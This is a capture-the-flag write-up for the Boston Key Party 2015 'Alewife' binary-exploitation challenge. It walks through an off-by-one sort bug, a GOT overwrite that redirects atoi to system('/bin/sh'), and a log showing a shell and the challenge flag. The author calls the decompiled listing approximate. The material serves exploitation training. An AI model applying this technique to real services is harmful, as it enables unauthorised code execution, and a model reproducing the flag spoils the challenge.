## Boston Key Party 2015 - Alewife (Pwn 400)
##### 27/02 - 01/03/2015 (43hr)
___

### Description: 
alewife.bostonkey.party 8888 : 400
___
### Solution

The first step is to decompile the binary. We have a C++ code with 3 classes. The purpose of this
challenge is to exploit it, not to fully reversing it. Some parts of the decompiled version may be 
wrong or missing, but who cares? I stopped the reversing once I found the vulnerability. 

I won't analyse how I decompile the code. The purpose of the writeup is not to demostrate how to
reverse C++ objects and classes, as there're tons of tutorials on how to do this. So let's present
the decompiling approach (I omit useless stuff like variable declarations).

Don't expect this code to run :) The decompiled code is just to help you understand what's going
on. Let's start:
```c++
// ------------------------------------- REVERSING THE BINARY --------------------------------------
/* ---------- Let's start with class declarations ---------- */
typedef struct {
	char s[64];
} mystring;

class object {
#define OBJ_ARR_LEN 0x800
	public:
		long long int 	used;				// offset 0x0
		char 			array[OBJ_ARR_LEN]; // offset 0x8
		void*			ptr; 				// offset 0x808 (can be long long int or mystring)
		long long int	N; 					// offset 0x810
		void 			(*prntarr)(int); 	// offset 0x818
		int 			(*sort)(int); 		// offset 0x820

};											// sizeof(object) = 0x828
/***** ---------- *****/
class otherobj {
#define OTHEROBJ_ARR_LEN 0x4000
	public:
	long long int 	used;					// offset 0
	char			array[OTHEROBJ_ARR_LEN];// offset 8;
	long long int 	N;						// offset 0x4008
	int 			(*fp)(int);				// offset 0x4010
};											// sizeof( otherobj ) = 0x4018
/***** ---------- *****/
object		S1[32], 						// starts at address 0x6831C0
	  	 	S2[32];							// starts at address 0x6936C0
otherobj	S3[31]; 						// starts at address 0x602EC0

/* -------------------- This is the main loop -------------------- */
while( 1 )
{
	write(stdout, "Array Ops\n", 10);
	num1 = read_byte(": ");

	switch( num1 )
	{
		// ------------------------------------------------------------------------------
		case 1:	num2 = read_byte("-: ");
			switch( num2 )
			{
				case 0: continue;
				case 1: printf("%d\n", functbl_1());         					  break;
				case 2: num3 = read_byte("--: "); printf("%d\n", functbl_2(num3)); break;
				case 3: num3 = read_byte("--: "); printf("%d\n", functbl_3(num3)); break;
				case 4: num3 = read_byte("--: "); printf("%d\n", functbl_4(num3)); break;
				case 5: num3 = read_byte("--: ");  
						num4 = read_byte("--: "); printf("%d\n", new_obj(num3, num4)); 
						break;
				default: continue;
			}
			break;
		// ------------------------------------------------------------------------------
		case 2: num2 = read_byte("-: ");
			switch( num2 )
			{
				case 2: num3 = read_byte("--: "); printf( "%d\n", obj_int_op  (num3) ); break;
				case 3: num3 = read_byte("--: "); printf( "%d\n", obj_int_clr (num3) ); break;
				case 4: num3 = read_byte("--: "); printf( "%d\n", obj_int_prnt(num3) ); break;
			}	
			break;
		// ------------------------------------------------------------------------------
		case 3: num2 = read_byte("-: ");
			switch( number_2 )
			{
				case 2: num3 = read_byte("--: ");printf( "%d\n", obj_str_op(num3)   ); break;
				case 3: num3 = read_byte("--: ");printf( "%d\n", obj_str_clr(num3)  ); break;
				case 4: num3 = read_byte("--: ");printf( "%d\n", obj_str_prnt(num3) ); break;
			}	
			break;
		// ------------------------------------------------------------------------------
		case 0x63: exit(-1);
		// ------------------------------------------------------------------------------
	}
}

/* -------------------- "object" class functions for integers  -------------------- */
int obj_int_op(int num3)
{
	if( num3 > 31 ) 	     return -1;
	if( S1[num3].used == 0 ) return -1;

	num4 = read_byte("i: ");
	switch( num4 )
	{
		// --------------------------------------------------------------------
		case 1: // INSERT
			num5 = read_byte("ii: ");
			if( num5 > OBJ_ARRAY_LEN/8 ) return -1;
			
			for( ; num5>=0 && S1[num3].N<OBJ_ARRAY_LEN/8; S1[num3].N++, num5-- )
			{
				// treat ptr as long long int
				S1[num3].ptr[ S1[num3].N ] = read_long("iii: ");
			}
			return S1[num3].N;
		// --------------------------------------------------------------------
		case 3: // SORT 
			(*S1[num3].sort)(&S1[num3]); return num3;
		// --------------------------------------------------------------------
		case 4: // POP	
			S1[num3].N--; return num3;
		// --------------------------------------------------------------------
		default: return -1;
	}
}
// ----------------------------------------------------------------------------
int obj_int_clr(int num3)
{
	if( num3 > 31 ) 	  	 return -1;
	if( S1[num3].used == 0 ) return -1;

	memset(S1[num3], 0, sizeof(object));

	return num3;
}
// ----------------------------------------------------------------------------
void obj_int_prnt(int num3)
{
	if( num3 > 31 ) return -1;

	(*S1[num3].prntarr)( &S1[num3] );
}

/* -------------------- "object" class functions for strings  -------------------- */
// These functions are very similar with the 3 functions above. As you can see we
// can use the object to store either integers or strings. Yeah I know, declaring
// ptr as "long long int" is not right here....
int obj_str_op(int num3)
{
	if( num3 > 31 ) 	     return -1;
	if( S2[num3].used == 0 ) return -1;

	num4 = read_byte("s: ");
	switch( num4 )
	{
		// --------------------------------------------------------------------
		case 2: // INSERT
			num5 = read_byte("ss: ");
			if( num5 > OBJ_ARR_LEN/64 ) return -1;
			
			for( ; num5>=0 && S2[num3].N<OBJ_ARRAY_LEN/64; S2[num3].N++, num5-- )
			{
				// treat ptr as a pointer to mystring
				S2[num3].ptr[ S2[num3].N ] = read_64bytes("sss: ");
			}
			return S2[num3].N;
		// --------------------------------------------------------------------
		case 3: // SORT 
			(*S2[num3].sort)(&S2[num3]); return num3;
		// --------------------------------------------------------------------
		case 4: // POP	
			S2[num3].N--; return num3;
		// --------------------------------------------------------------------
		default: return -1;
	}
}
// ----------------------------------------------------------------------------
int obj_str_clr(int num3)
{
	if( num3 > 31 ) 	  	 return -1;
	if( S2[num3].used == 0 ) return -1;

	memset(S2[num3], 0, sizeof(object));

	return num3;
}
// ----------------------------------------------------------------------------
void obj_str_prnt(int num3)
{
	if( num3 > 31 ) return -1;

	(*S2[num3].prntarr)( &S2[num3] );
}

/* -------------------- class constructors  -------------------- */
int alloc_obj_long()
{
	for( i=0; i<32; i++ )
	if( S1.o[i].used == 0 )					// search for an empty slot
	{
		S1[i].used 		= 1;				// reserve it
		S1[i].ptr    	= &S1[i].array;
		S1[i].ptrnarr  	= &prntarr_long; 	// 0x401ED0
		S1[i].sort  	= &sort_long	 	// 0x401C42
		S1[i].N   	 	= 0;

		memset(S1[i].array, 0, OBJ_ARR_LEN);	
		return i;
	}
}
// ----------------------------------------------------------------------------
int alloc_obj_str()
{
	for( i=0; i<32; i++ )
	if( S2[i].used == 0 )					// search for an empty slot
	{
		S2[i].used 		= 1;				// reserve it
		S2[i].ptr    	= &S2[i].array;
		S2[i].prntarr  	= &prntarr_str; 	// 0x401E2B
		S2[i].sort  	= &sort_str;	 	// 0x401B4C
		S2[i].N   	 	= 0;

		memset(S2[i].array, 0, OBJ_ARR_LEN);
		return i;
	}
}
// ----------------------------------------------------------------------------
int new_obj(int num3, int num4 ) 			// 1 - 5
{
	if( num3 > 31 ) return -1;

	if( num4 == 2 )							// integer  type
	{
		v4 = alloc_obj_long()

		if( set_S1(S3[num3], S1[v4]) )
			memset(S1[v4], 0, sizeof(object));
	}
	else if( num4 == 3 )					// string type
	{
		v4 = alloc_obj_str();

		if( set_S2(S3[num3], S2[v4]) )
			memset(S2[v4], 0, sizeof(object));
	}
}
// ----------------------------------------------------------------------------
// Here polymorphism comes into game: We can store objects from either S1 or S2, ignoring 
// from where they come from.
int set_S1( SS s3, S s1 )						// store an integer object
{
	if( s1 == NULL ) return -1;
	
	for(i=0; i<s3.N; i++)
	{
		if( s3.array[i << 6] != 2 ) return -1;	// check type

		// ptr is an 8 byte pointer
		s1.ptr[i] = s3.array[(i << 6) + 0x8];
		s1.N++;
	}

	return 0;
}
// ----------------------------------------------------------------------------
int set_S2( SS s3, S s2 )						// store a string object
{
	if( s1 == NULL ) return -1;
	
	for(i=0; i<s3.N; i++)
	{
		if( s3.array[i << 6] != 3 ) return -1;	// check type

		// ptr is an 8 byte pointer
		s2.ptr[i] = s3.array[(i << 6) + 0x28];
		s2.N++;
	}

	return 0;
}

/* -------------------- function family 1 -------------------- */
int functbl_1( void )
{
	for( i=0; i<32; i++ )
	if( S3[i].used == 0 )
	{
		// call sub_4022C5(S3.oo[i])
		S3[i].used = 1;
		S3[i].ptr  = 0x401D27;
		S3[i].N    = 0;
		
		memset(S3[i].array, 0, 0x4000);
		return i;
	}
}
// --------------------------------------------------------------------------------------
int functbl_2(int num3)
{
	if( num3 > 31 ) 			return -1;
	if( S2[num3].used == 0 ) 	return -1;

	num4 = read_byte("*: ");
	switch( num4 )
	{
		//---------------------------------------------------------------------
		case 0: return -1;
		//---------------------------------------------------------------------
		case 1:
			num5 = read_byte("**: ");
			if( num5 > 256 ) return -1;

			for( ; num5 && S3[num3].N<256; S3[num3].N++, num5-- )
			{
				v28 = S3[num].[0x8 + (S3[num3].N << 6)]

				S3[num].array[S3[num3].N << 6] = 2;				
				
				// call(read_long("***: "), S3[num].[0x8 + (S3[num3].i << 6)])
				S3[num].array[0x8 + (S3[num3].N << 6)] = read_long("***: ");
				S3[num].array[0x8 + (S3[num3].N << 6) + 8]    = 0x402008;
				S3[num].array[0x8 + (S3[num3].N << 6) + 0x10] = 0x401F75;
				S3[num].array[0x8 + (S3[num3].N << 6) + 0x18] = 0x401FDB;
			}

			return num5;
		//---------------------------------------------------------------------	
		case 2:
			num5 = read_byte("**: ");
			if( num5 > 256 ) return -1;

			for( ; num5 && S3[num3].N<256; S3[num3].N++, num5-- )
			{
				v30 = S3[num].array[0x8 + (S3[num3].N << 6)];

				S3[num].array[S3[num3].N << 6] = 3;
				
				 // call(read_64bytes("***: "), S3[num].[0x8 + (S3[num3].i << 6)])
				S3[num].array[0x8 + (S3[num3].N << 6)] = read_64bytes("***: ");
				S3[num].array[0x8 + (S3[num3].N << 6) + 8]    = 0x40214E;
				S3[num].array[0x8 + (S3[num3].N << 6) + 0x10] = 0x402063;
			}

			return num5;
		//---------------------------------------------------------------------
		case 3: return -1;
		//---------------------------------------------------------------------
		case 4: S3[num3].N--; return num3;
		//---------------------------------------------------------------------
		case 5: return -1;
		//---------------------------------------------------------------------
		case 6: return -1;
		//---------------------------------------------------------------------
		case 7:
			num5 = read_byte("**: ");
			num6 = read_byte("**: ");

			if( num6 > S3[num3].N ) return -1;

			if( S3[num3].array[num5 << 6] != 2 ) return -1;
			if( S3[num3].array[num6 << 6] != 2 ) return -1;				


			v40 = S3[num3].array[(num5 << 6) + 8];
			v48 = S3[num3].array[(num6 << 6) + 8];

			// call(v40,  v48)
			(*S3[num3].array[(num5 << 6) + 8 + 0x18])(v40, v48);

			return num3;
		//---------------------------------------------------------------------
		case 8:	
			num5 = read_byte("**: ");
			num6 = read_byte("**: ");

			if( num6 > S3[num3].N ) return -1;

			if( S3[num3].array[num5 << 6] != 2 ) return -1;
			if( S3[num3].array[num6 << 6] != 2 ) return -1;				


			v40 = S3[num3].array[(num5 << 6) + 8];
			v48 = S3[num3].array[(num6 << 6) + 8];

			// call(v40,  v48)
			(*S3[num3].array[(num5 << 6) + 8 + 0x10])(v40, v48);

			return num3;
		//---------------------------------------------------------------------
		case 9:
			num5 = read_byte("**: ");
			num6 = read_byte("**: ");

			if( num6 > S3[num3].i ) return -1;

			if( S3[num3].array[num5 << 6] != 3 ) return -1;
			if( S3[num3].array[num6 << 6] != 3 ) return -1;				


			v50 = S3[num3].array[(num5 << 6) + 0x28];
			v58 = S3[num3].array[(num6 << 6) + 0x28];

			// call(v50,  v58)
			(*S3[num3].array[(num6 << 6) + 0x28 + 0x10])(v50, v58);

			return num3;
		//---------------------------------------------------------------------
		default: return -1;
	}

	printf("**: "); scanf("%c", &number_5);
}

// ----------------------------------------------------------------------------
int functbl_3(int num3)
{
	if( num3 > 31 ) 			return -1;
	if( S3[num3].used == 0 ) return -1;

	memset(&S3[num3], 0, sizeof(otherobj) )

	return num3;
}
// ----------------------------------------------------------------------------
int functbl_4(int num3)
{
	if( num3 > 31 ) return -1;
	
	(*S3[num3].fp)( &S3[num3] );
}

/* -------------------- function pointers -------------------- */
/*
	FUNC_PTR_0:0x401B4C		--> s2.fp2  ptr1 ??
	FUNC_PTR_1:0x401C42		--> s1.fp2  ptr1 ??
	FUNC_PTR_9:0x401D27		--> prntarr_bytes
	FUNC_PTR_2:0x401E2B		--> s2.fp1	prntarr_str
	FUNC_PTR_3:0x401ED0		--> s1.fp1  prntarr_long
	FUNC_PTR_4:0x401F75		--> add
	FUNC_PTR_5:0x401FDB		--> sub
	FUNC_PTR_6:0x402008		--> ltoa
	FUNC_PTR_7:0x402063		--> concat
	FUNC_PTR_8:0x40214E		--> deref
*/
// ----------------------------------------------------------------------------
void ptr0_shift( object obj )
{
	for(i=1; i<=obj.i; i++)
	{
		for(j=i-1; j>=0; j-- )
		{
			obj.ptr[(j+1)*8] = obj.ptr[j*8];
			
			// call(obj.ptr[i*8], obj.ptr[j*8])
			if( is_lessthan(obj.ptr[i*8], obj.ptr[j*8]) == 0 ) break;		
		}
	}
}
// ----------------------------------------------------------------------------
int is_lessthan( int *pi, int *pj )
{
	if( pi == 0 ) return 0;
	if( pj == 0 ) return 1;

	while( *pi && *pj )
	{
		if( *pi < *pj ) return 1;
		if( *pj < *pi ) return 0;

		pi++;
		pj++;
	}

	if( *pj ) return 1;
	else      return 0;
}
// ----------------------------------------------------------------------------
void ptr1_int_sort(object obj)
{
	// bubble sort :)
	for(i=1; i<=obj.i; i++)
	{
		bkp = obj.ptr[i];

		for(j=i-1; j>=0 && obj.ptr[j]>bkp; j-- )
		{
			obj.ptr[j+1] = obj.ptr[j];
		}
		obj.ptr[j] = bkp;
	}
}
// ----------------------------------------------------------------------------
void ptr2_prntarr_str(object obj)
{
	puts( "[" );
	
	for(i=0; i<=obj.i; i++)
	{
		printf("%s", obj.ptr[i*8]);

		if( i != obj.i -1 ) puts( ",");
	}

	puts( "\n]" );
}
// ----------------------------------------------------------------------------
void ptr3_prntarr_long(object obj)
{
	puts( "[" );
	
	for(i=0; i<=obj.i; i++)
	{
		printf("%lu", obj.ptr[i*8]);

		if( i != obj.i -1 ) puts( ",");
	}

	puts( "\n]" );
}
// ----------------------------------------------------------------------------
long long int ptr4_add(long long int *a, long long int *b)
{
	if( !a || !b ) return -1;

	*a += *b;
	return *a;
}
// ----------------------------------------------------------------------------
long long int ptr5_sub(long long int *a, long long int *b)
{
	if( !a || !b ) return -1;

	*a -= *b;
	return *a;
}
// ----------------------------------------------------------------------------
char* ptr6_ltoa(long long int *arg)
{
	s = malloc(64);
	
	if( s == NULL || arg == NULL ) return NULL;

	snprintf( s, 64, "%llu", *arg )

	return s;
}
// ----------------------------------------------------------------------------
char* ptr7_concat(long long int *arg1, long long int *arg2)
{
	if(  arg1 == 0 ||  arg2 == 0 ) return 0;
	if( *arg1 == 0 || *arg2 == 0 ) return 0;

	r = realloc( arg1, strlen(*arg1)+strlen(*arg2) );

	memcpy(r, *arg2, strlen(*arg1)+strlen(*arg2) );

	return r;
}
// ----------------------------------------------------------------------------
char* ptr8_deref(long long int *a)
{
	if( a == 0 ) return 0;

	return *a;
}
// ----------------------------------------------------------------------------
char* ptr8_ptrnarr_bytes(otherobject obj)
{
	puts( "[" );
	
	for(i=0; i<s3.i; i++)
	{
		if( obj.array[i << 6] == 2 )
		{
			printf( "    %s", (*obj.array[(i << 6) + 8])(&obj.array[(i << 6) + 8]) );
		}
		else
		{
			printf( "    \"%s\"", (*obj.array[(i << 6) + 8])(&obj.array[(i << 6) + 0x28]) );
	
		if( i != obj.i -1 ) puts( ",");
	}

	puts( "\n]" );
}
/* -------------------- reading functions -------------------- */
char read_byte( char *inp )
{
	printf( "%s", inp );
	fflush(stdout);

	read(0, buf, 0x3f);

	return atoi(buf);
}
// ----------------------------------------------------------------------------
long long int read_long( char *inp )
{
	printf( "%s", inp );
	fflush(stdout);

	read(0, buf, 0x3f);

	return strtoul(buf, 0, 10);
}
// ----------------------------------------------------------------------------
void *read_64bytes( char *inp )
{
	printf( "%s", inp );
	fflush(stdout);

	read(0, buf, 0x3f);

	return buf;
}
```

### The vulnerability
I apologize for the above code. I reverse it within few hours, so be patient with mistakes... :)

Ok let's focus on the vulnerability, which is on function ptr1_int_sort

```assembly
.text:0000000000401C42 ; =============== S U B R O U T I N E =======================================
.text:0000000000401C42 FUNC_PTR_1_401C42 proc near
.text:0000000000401C42
.text:0000000000401C42 var_28          = qword ptr -28h
.text:0000000000401C42 var_20          = qword ptr -20h
.text:0000000000401C42 obj_ptr_18      = qword ptr -18h
.text:0000000000401C42 obj_i_10        = qword ptr -10h
.text:0000000000401C42 var_8           = dword ptr -8
.text:0000000000401C42 i_4             = dword ptr -4
.text:0000000000401C42
.text:0000000000401C42                 push    rbp
.text:0000000000401C43                 mov     rbp, rsp
.text:0000000000401C46                 mov     [rbp+var_28], rdi
.text:0000000000401C4A                 mov     rax, [rbp+var_28]
.text:0000000000401C4E                 mov     rax, [rax+object.i]
.text:0000000000401C55                 mov     [rbp+obj_i_10], rax
.text:0000000000401C59                 mov     rax, [rbp+var_28]
.text:0000000000401C5D                 mov     rax, [rax+object.ptr]
.text:0000000000401C64                 mov     [rbp+obj_ptr_18], rax
.text:0000000000401C68                 mov     [rbp+i_4], 1
.text:0000000000401C6F                 jmp     END_401D16
.text:0000000000401C74 ; ---------------------------------------------------------------------------
.text:0000000000401C74
.text:0000000000401C74 LOOP_401C74:                            ; CODE XREF: FUNC_PTR_1_401C42+DDj
.text:0000000000401C74                 mov     eax, [rbp+i_4]
.text:0000000000401C77                 cdqe
.text:0000000000401C79                 lea     rdx, ds:0[rax*8]
.text:0000000000401C81                 mov     rax, [rbp+obj_ptr_18]
.text:0000000000401C85                 add     rax, rdx
.text:0000000000401C88                 mov     rax, [rax]
.text:0000000000401C8B                 mov     [rbp+var_20], rax
.text:0000000000401C8F                 mov     eax, [rbp+i_4]
.text:0000000000401C92                 sub     eax, 1
.text:0000000000401C95                 mov     [rbp+var_8], eax
.text:0000000000401C98                 jmp     short loc_401CD0
.text:0000000000401C9A ; ---------------------------------------------------------------------------
.text:0000000000401C9A
.text:0000000000401C9A loc_401C9A:                             ; CODE XREF: FUNC_PTR_1_401C42+AFj
.text:0000000000401C9A                 mov     eax, [rbp+var_8]
.text:0000000000401C9D                 cdqe
.text:0000000000401C9F                 add     rax, 1
.text:0000000000401CA3                 lea     rdx, ds:0[rax*8]
.text:0000000000401CAB                 mov     rax, [rbp+obj_ptr_18]
.text:0000000000401CAF                 add     rdx, rax
.text:0000000000401CB2                 mov     eax, [rbp+var_8]
.text:0000000000401CB5                 cdqe
.text:0000000000401CB7                 lea     rcx, ds:0[rax*8]
.text:0000000000401CBF                 mov     rax, [rbp+obj_ptr_18]
.text:0000000000401CC3                 add     rax, rcx
.text:0000000000401CC6                 mov     rax, [rax]
.text:0000000000401CC9                 mov     [rdx], rax
.text:0000000000401CCC                 sub     [rbp+var_8], 1
.text:0000000000401CD0
.text:0000000000401CD0 loc_401CD0:                             ; CODE XREF: FUNC_PTR_1_401C42+56j
.text:0000000000401CD0                 cmp     [rbp+var_8], 0
.text:0000000000401CD4                 js      short loc_401CF3
.text:0000000000401CD6                 mov     eax, [rbp+var_8]
.text:0000000000401CD9                 cdqe
.text:0000000000401CDB                 lea     rdx, ds:0[rax*8]
.text:0000000000401CE3                 mov     rax, [rbp+obj_ptr_18]
.text:0000000000401CE7                 add     rax, rdx
.text:0000000000401CEA                 mov     rax, [rax]
.text:0000000000401CED                 cmp     rax, [rbp+var_20]
.text:0000000000401CF1                 ja      short loc_401C9A
.text:0000000000401CF3
.text:0000000000401CF3 loc_401CF3:                             ; CODE XREF: FUNC_PTR_1_401C42+92j
.text:0000000000401CF3                 mov     eax, [rbp+var_8]
.text:0000000000401CF6                 cdqe
.text:0000000000401CF8                 add     rax, 1
.text:0000000000401CFC                 lea     rdx, ds:0[rax*8]
.text:0000000000401D04                 mov     rax, [rbp+obj_ptr_18]
.text:0000000000401D08                 add     rdx, rax
.text:0000000000401D0B                 mov     rax, [rbp+var_20]
.text:0000000000401D0F                 mov     [rdx], rax
.text:0000000000401D12                 add     [rbp+i_4], 1
.text:0000000000401D16
.text:0000000000401D16 END_401D16:                             ; CODE XREF: FUNC_PTR_1_401C42+2Dj
.text:0000000000401D16                 mov     eax, [rbp-4]
.text:0000000000401D19                 cdqe
.text:0000000000401D1B                 cmp     rax, [rbp+obj_i_10]
.text:0000000000401D1F                 jbe     LOOP_401C74
.text:0000000000401D25                 pop     rbp
.text:0000000000401D26                 retn
.text:0000000000401D26 FUNC_PTR_1_401C42 endp
```
Let's see the decompiled code:
```c++
	void ptr1_int_sort(object obj)
	{
		for(i=1; i<=obj.i; i++)
		{
			bkp = obj.ptr[i];

			for(j=i-1; j>=0 && obj.ptr[j]>bkp; j-- )
			{
				obj.ptr[j+1] = obj.ptr[j];
			}
			obj.ptr[j] = bkp;
		}
	}
```
Can you see the problem? It's an off-by-one error. When we sort the array elemets we're going from
0 up to N, and not up to N-1. Ok let's see the memory layout of an object "object":
```
	0x000 +-----------------+
		  | used            |
	0x008 +-----------------+
		  | array           |
		  |                 |
		  .                 .
		  |                 |
	0x808 +-----------------+
		  | ptr             |
	0x810 +-----------------+
		  | N               |
	0x818 +-----------------+
		  | prntarr*        |
	0x820 +-----------------+
		  | sort*           |
	0x828 +-----------------+
```
Array can hold up to 256 numbers. Right after is the pointer that points to an element inside
array. If we have an array with 256 numbers and we try to sort them, then the bubble sort
algorithm may exchange the value of ptr with the value of another number in the array (that
number must be greater however). Let's see an example. Array contains values 0x1000000 through
0x10000ff:
```
	Breakpoint 1, 0x0000000000401c42 in ?? ()
	1: x/i $pc
	=> 0x401c42:	push   %rbp
	(gdb) x/64xg 0x6831C0
	0x6831c0:	0x0000000000000001	0x0000000001000000	--> array starts here
	0x6831d0:	0x0000000001000001	0x0000000001000002
	....
	0x6839b0:	0x00000000010000fd	0x00000000010000fe
	0x6839c0:	0x00000000010000ff	0x00000000006831c8	--> here's ptr
	0x6839d0:	0x0000000000000100	0x0000000000401ed0	--> here's N and prntarr*
```
After sorting the values will be:
```
	(gdb) x/64xg 0x6831C0
	0x6831c0:	0x0000000000000001	0x00000000006831c8	--> ptr go here
	0x6831d0:	0x0000000001000000	0x0000000001000001
	....
	0x6839c0:	0x00000000010000fe	0x00000000010000ff	--> we have overwritten old ptr!
	0x6839d0:	0x0000000000000100	0x0000000000401ed0
	0x6839e0:	0x0000000000401c42	0x0000000000000000
```
Ok ptr now points to 0x10000ff. By using the same method we can make it point to any value that
is greater than the current one (0x6831c8 - at the beginning of the buffer).

ptr is the last value on the table, so after sorting it will has the greatest value. If we want
to overwrite ptr, we must insert a value which is greater. This is a problem because GOT start 
from 0x602DB8 which means that we can't directly overwrite ptr with any value in GOT.

We'll do this trick: We'll shift the lower bound of the array by overwriting ptr with value
0x6839b0. Then we'll make some "pops" to decrease the value of N. Thus we'll be able to overwrite
ptr with any value.

Let's set ptr to 0x6839b0 and N to 0 (by popping all values). Then insert 3 values. The first
2 values will be garbage and the 3rd will overwrite ptr. Let's set the 3rd value to  0x602DB8
(the address of puts).
Oh yeah I know, I could have use other values to do the same, maybe in an easier way :)

Awesome! now we did ptr point to GOT netry of puts(). N is 3+1=4, so if we print the contents
of S1[0], we can read the address of puts.

At this point we can't use S1[0] anymore because it's pointing inside the GOT. No problem, let's
use S1[1] (we have 32 available :P).

We do the same for S1[1], and we make ptr point to atoi() this time. Then we overwrite the 
address of atoi() with the address of system().

But which is the address of system()? It's easy to find it: If we open the libc.so file we can 
find the offset between puts() and system(). We know puts(), so it's trivial to find address of
system(). The requirement is to have the right libc ;)

After overwriting atoi() with system(), it's time to trigger the vulnerability. After inserting
the last value (which overwrites the atoi() in GOT), program execution is here:
```
	while( 1 )
	{
		write(stdout, "Array Ops\n", 10);
		num1 = read_byte(": ");
	...
```
Program is waiting for user to type an operation. Recall read_byte:
```
	char read_byte( char *inp )
	{
		printf( "%s", inp );
		fflush(stdout);

		read(0, buf, 0x3f);		<-- we're waiting here!

		return atoi(buf);
	}
```
Now atoi() is overwritten with system(). All we have to do is to send the string "/bin/sh". Thus
when we call atoi(buf), we actually call system("/bin/sh"). Game Over.

```
ispo@nogirl ~/bkp $ python central_square.py 
 **** PHASE 1: Leak an address **** 
Leaking address of puts: 0x7fc08f7e99c0
 **** PHASE 2: exploit! ****
Caclulating address of system: 0x7fc08f7bf640
 *** Opening Shell *** 
ls -l
	total 84
	drwxr-xr-x   2 root root  4096 Feb 27 18:43 bin
	drwxr-xr-x   3 root root  4096 Feb 27 18:44 boot
	drwxr-xr-x  13 root root  4000 Feb 27 18:44 dev
	drwxr-xr-x  90 root root  4096 Feb 27 18:44 etc
	drwxr-xr-x   4 root root  4096 Feb 27 18:25 home
	lrwxrwxrwx   1 root root    33 Feb 27 18:43 initrd.img -> boot/initrd.img-3.13.0-46-generic
	lrwxrwxrwx   1 root root    33 Jan 23 00:41 initrd.img.old -> boot/initrd.img-3.13.0-44-generic
	drwxr-xr-x  21 root root  4096 Jan 23 00:40 lib
	drwxr-xr-x   2 root root  4096 Feb 27 18:43 lib64
	drwx------   2 root root 16384 Jan 23 00:42 lost+found
	drwxr-xr-x   2 root root  4096 Jan 23 00:39 media
	drwxr-xr-x   3 root root  4096 Jan 30 23:39 mnt
	drwxr-xr-x   2 root root  4096 Jan 23 00:39 opt
	dr-xr-xr-x 189 root root     0 Feb 27 18:16 proc
	drwx------   3 root root  4096 Feb 27 18:49 root
	drwxr-xr-x  19 root root   740 Feb 28 07:37 run
	drwxr-xr-x   2 root root 12288 Feb 27 18:43 sbin
	drwxr-xr-x   2 root root  4096 Jan 23 00:39 srv
	dr-xr-xr-x  13 root root     0 Feb 27 18:16 sys
	drwx-wx-wt   2 root root  4096 Mar  1 14:17 tmp
	drwxr-xr-x  10 root root  4096 Jan 23 00:39 usr
	drwxr-xr-x  12 root root  4096 Jan 23 00:42 var
	lrwxrwxrwx   1 root root    30 Feb 27 18:43 vmlinuz -> boot/vmlinuz-3.13.0-46-generic
	lrwxrwxrwx   1 root root    30 Jan 23 00:41 vmlinuz.old -> boot/vmlinuz-3.13.0-44-generic
cd /home
ls
	array
	ubuntu
cd array
ls
	array
	flag
cat flag
	Because_C++_is_t00_hard!!!
```

Have a nice day!
Bye bye :)
___